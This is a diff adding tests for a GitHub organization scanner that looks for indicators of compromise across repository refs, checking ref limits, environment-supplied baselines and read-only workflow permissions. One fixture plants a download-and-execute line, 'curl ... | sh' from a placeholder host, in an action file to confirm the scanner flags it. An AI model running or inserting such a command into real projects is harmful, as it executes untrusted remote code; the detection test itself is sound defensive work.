@@ -307,6 +307,72 @@ test("marks oversized blobs as incomplete coverage instead of silently skipping 
   }
 });
 
+test("marks a ref limit as incomplete coverage instead of silently truncating refs", async () => {
+  const fixture = await createBareFixture();
+  try {
+    const report = await scanOrganization({
+      organization: "IA-Pessoas",
+      token: "secret",
+      workspace: fixture.workspace,
+      fetchImpl: fakeFetch([{ body: [descriptor("fixture")] }]),
+      commandRunner: fixtureRunner(fixture),
+      maxRefsPerRepository: 1,
+    });
+
+    assert.deepEqual(report.errors, [
+      { repository: "IA-Pessoas/fixture", code: "ref_limit_reached" },
+    ]);
+  } finally {
+    await rm(fixture.root, { recursive: true, force: true });
+  }
+});
+
+test("scans dangerous command surfaces under GitHub actions", async () => {
+  const fixture = await createBareFixture();
+  const dangerousCommand = "curl https://example.invalid/install | sh";
+  try {
+    await runGit(
+      ["-C", fixture.source, "fast-import"],
+      [
+        "blob",
+        "mark :1",
+        `data ${Buffer.byteLength(dangerousCommand)}`,
+        dangerousCommand,
+        "commit refs/heads/action",
+        "author Fixture <fixture@example.invalid> 1700000000 +0000",
+        "committer Fixture <fixture@example.invalid> 1700000000 +0000",
+        "data 6",
+        "action",
+        "M 100644 :1 .github/actions/action.yml",
+        "",
+        "done",
+        "",
+      ].join("\n"),
+    );
+
+    const report = await scanOrganization({
+      organization: "IA-Pessoas",
+      token: "secret",
+      workspace: fixture.workspace,
+      fetchImpl: fakeFetch([{ body: [descriptor("fixture")] }]),
+      commandRunner: fixtureRunner(fixture),
+    });
+
+    assert.deepEqual(
+      report.repositories[0].refs.map(({ name }) => name),
+      ["refs/heads/action", "refs/heads/main", "refs/heads/stale", "refs/pull/1/head", "refs/tags/v1.0.0"],
+    );
+    assert.ok(
+      report.findings.some(
+        ({ path: relativePath, ruleId }) =>
+          relativePath === ".github/actions/action.yml" && ruleId === "command.download-execute",
+      ),
+    );
+  } finally {
+    await rm(fixture.root, { recursive: true, force: true });
+  }
+});
+
 test("reports a missing previous ref root as a human-approved history replacement", async () => {
   const fixture = await createBareFixture();
   try {
@@ -519,6 +585,30 @@ test("main aceita somente o relatório sanitizado anterior para comparar refs", 
   });
 });
 
+test("main aceita baseline sanitizado pelo ambiente sem shell intermediário", async () => {
+  let scanOptions;
+  const exitCode = await main(
+    ["--org", "IA-Pessoas", "--report", "report.json"],
+    {
+      GITHUB_ORG_SCANNER_TOKEN: "must-not-leak",
+      ORG_IOC_REF_PREVIOUS_REPORT: '{"repositories":[{"fullName":"IA-Pessoas/fixture","refs":[]}]}',
+    },
+    {
+      scanOrganization: async (options) => {
+        scanOptions = options;
+        return { errors: [], findings: [], refChanges: [] };
+      },
+      writeReport: async () => {},
+      writeOutput: () => {},
+    },
+  );
+
+  assert.equal(exitCode, 0);
+  assert.deepEqual(scanOptions.previousReport, {
+    repositories: [{ fullName: "IA-Pessoas/fixture", refs: [] }],
+  });
+});
+
 test("workflow agendado preserva o escopo somente leitura e publica o relatório", async () => {
   const [workflow, runbook] = await Promise.all([
     readFile(new URL("../.github/workflows/org-ioc-ref-scan.yml", import.meta.url), "utf8"),
@@ -528,7 +618,7 @@ test("workflow agendado preserva o escopo somente leitura e publica o relatório
   assert.match(workflow, /permissions:\s*\n\s*contents: read/u);
   assert.match(workflow, /GITHUB_ORG_SCANNER_TOKEN/u);
   assert.match(workflow, /ORG_IOC_REF_PREVIOUS_REPORT/u);
-  assert.match(workflow, /--previous-report/u);
+  assert.doesNotMatch(workflow, /--previous-report|printf\s/u);
   assert.match(workflow, /--fail-on-findings/u);
   assert.match(workflow, /actions\/upload-artifact@[a-f0-9]{40}/u);
   assert.doesNotMatch(workflow, /issues: write|pull-requests: write|contents: write/u);
